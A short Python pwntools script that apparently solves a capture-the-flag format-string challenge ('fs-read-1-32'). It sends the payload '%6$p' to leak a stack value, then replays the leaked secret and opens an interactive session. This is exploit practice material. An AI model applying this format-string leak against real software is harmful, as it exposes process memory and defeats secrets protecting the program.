#!/usr/bin/env python

from pwn import *

p = process("./fs-read-1-32")

print(p.recv())

p.sendline("%6$p")

data = p.recv()
print(data)

random = data.split(' ')[1].split('\n')[0]

p.sendline(random)

p.interactive()
